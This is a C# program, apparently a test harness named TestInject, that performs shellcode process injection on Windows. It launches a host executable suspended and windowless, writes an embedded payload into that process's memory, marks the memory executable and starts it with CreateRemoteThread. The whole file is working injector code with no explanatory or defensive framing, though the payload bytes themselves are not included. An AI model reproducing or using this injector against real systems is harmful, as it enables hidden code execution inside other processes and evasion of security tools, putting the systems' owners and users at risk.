using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Native.Kernel32;

namespace TestInject
{
    internal class Program
    {

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
           string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
           ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
           IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public UInt32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);
        public static int? CreateProcess(string appPath)
        {
            var pInfo = new PROCESS_INFORMATION();
            var sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {

                var pSec = new SECURITY_ATTRIBUTES();
                var tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                if (CreateProcess(appPath, null, ref pSec, ref tSec, false, (uint)(CreationFlags.ExtendedStartupInfoPresent | CreationFlags.CreateSuspended | CreationFlags.CreateNoWindow), IntPtr.Zero, null, ref sInfoEx, out pInfo))
                {
                    return GetProcessId(pInfo.hProcess);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hThread);
                }
            }
            return null;
        }

        static void Main(string[] args)
        {
            try
            {
                var procRes = CreateProcess(Properties.Resources.Host);
                if (!procRes.HasValue)
                    throw new InvalidOperationException($"Failed to create process, error code: {Marshal.GetLastWin32Error()}");


                Process process = Process.GetProcessById(procRes.Value);
                IntPtr pHandle = process.Handle;

                var shellcode = Properties.Resources.Payload;


                var baseAddress = Native.Kernel32.VirtualAllocEx(
                    pHandle,
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ReadWrite);

                if (baseAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(pHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                    throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

                if (bytesWritten.ToInt32() != shellcode.Length)
                    throw new InvalidOperationException($"Failed to write All the shellcode into the process");

                if (!Native.Kernel32.VirtualProtectEx(
                    pHandle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");

                //Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                Debug.WriteLine(e.Message);
            }
            finally
            {
                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }

            Thread.Sleep(5000);


        }

    }
}
